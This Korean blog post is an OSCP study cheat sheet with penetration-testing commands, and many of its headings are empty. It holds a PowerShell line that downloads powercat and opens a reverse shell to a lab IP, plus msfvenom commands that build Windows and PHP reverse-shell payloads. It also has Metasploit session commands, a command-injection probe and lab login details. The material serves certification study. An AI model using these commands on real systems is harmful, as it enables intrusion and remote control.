---
layout: post
title: OSCP
subtitle: OSCP 자격증 시험 준비를 위한 정리
author: g3rm
categories: Certificate
banner:
  image: /assets/images/banners/home.gif
  opacity: 0.618
  background: "#000"
  heading_style: "font-size: 4.25em; font-weight: bold;"
  subheading_style: "color: gold"
tags:
  - OSCP
  - Kali_Linux
  - Offsec
sidebar:
---
## Flow
기본적으로 [정보 수집 > 취약점 스캔 > 권한 상승 > 다른 머신 침투] 의 틀을 가지고 있다.   
> 주로 Nmap 선에서 끝나는 것 같지만, 수동 정보 수집도 중요하니 막힐 땐 최대한 정보를 모아야 한다.   

## CheatSheet
OSCP 자격증 공부를 하면서 자주 사용하는 명령어 정리
### Nmap
#### TCP & UDP Port Scan

#### NSE Use

### DNS Enum

### SMB Enum

### SMTP Enum

### SNMP Enum

### WEB
#### Gobuster
#### Command Injection
```
# Window 일때, cmd, PowerShell 구분 / PetSerAl 검색
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# ps1 다운 후 실행
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

### Password
#### NTLM
#### HashCat

### Privilege Escalation
#### Window
##### Info Gather
##### Binary Hijacking
##### DLL Hijacking
##### Incorrect Path

#### Linux
##### Info Gather
##### Cron Jobs Abuse
##### Setuid Abuse
##### Sudo Abuse

##### Kernel Vuln Use

### Port Forwarding & Tunneling
#### Port Forwarding

#### SSH Tunneling
#### HTTP Tunneling
#### DNS Tunneling

### Metasploit
#### msfconsole
Nmap 및 공격 성공 시 얻는 세션 등 다양한 것들을 공유하여 사용할 수 있어 초기화 및 워크스페이스 생성 후 사용하는 것이 좋다.   

```Shell
# 초기화 및 접속
sudo msfdb (re)init
sudo systemctl enable postgresql
sudo msfconsole

# 워크스페이스 생성
workspace -a pen200

# Nmap 사용
db_nmap <기존 Nmap 옵션>
hosts
services

# 보조모듈 나열 exploits, payloads, auxiliary 등등 있음
show -h

# 검색
search type:<보조모듈> <검색어>
search type:auxiliary ssh
search Apache 2.4.49

# payload 검색
show payloads
set payloads <번호>

# 사용 및 세팅
use <번호>
show options
set <option> <value> / unset <option>
services -p 445 --rhosts # db_name으로 정보가 있다면 사용 가능
run

# 공격 성공하여 얻은 정보/세션들
creds
sessions / sessions -i <번호>

# meterpreter payload 이용 시
sysinfo
getuid
shell
channel -l
l<linux명령어> / lpwd / lcat ...
download <경로>
upload <칼리경로> <피해자경로>

# nc 안될 때, multi/handler 사용
use multi/handler

# session background
Ctrl+z 
```

#### msfvenom
https://github.com/puckel/Cheatsheets/blob/master/Cheatsheet_MetasploitPayloads.txt 참고   
```shell
# payloads 리스트 출력
msfvenom -l payloads --platform windows --arch x64

# payload 생성
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe

# web reverse shell
msfvenom -p php/reverse_php LHOST=192.168.45.241 LPORT=9999 -f raw -o php_reverse_9999.pHP
cat php_reverse_9999.pHP | pbcopy && echo '<?php ' | tr -d '\n' > php_reverse_9999.pHP && pbpaste >> php_reverse_9999.pHP
```

### Etc
#### RDP 접근
``` shell
xfreerdp /drive:test,/home/kali/offsec /u:nadine /p:123abc /v:192.168.145.227

# Remote Desktop Users 또는 Remote Management Users  권한 없는 유저 접근 법
runas /user:backupadmin cmd
```
#### SSH 접근
```shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" User@IP
```
#### FTP 접근
```shell
# 기본적인 FTP 접근 
ftp <IP> 

# 파일 디렉토리 탐색 
pwd # 현재 작업 디렉토리 표시 
cd <dir_name> # 특정 디렉토리 이동 
ls # 현재 디렉토리 파일 및 폴더 목록 표시 (dir도 가능) 

# 파일 전송 
get <file_name> # 로컬에 파일 다운로드 
mget <file1 file2 ..> # 로컬에 다수 파일 다운로드 
put <file_name> # 서버에 파일 업로드 
mput <file1 file2 ...> # 서버에 다수 파일 업로드 

# 파일 조작 
delete  
```
#### Netcat
```shell
nc -nvlp <port>
```

#### Python File Download
```shell
# Python server start
python3 -m http.server 80

# Window
iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe

# Linux
curl http://192.168.48.3/adduser.exe
```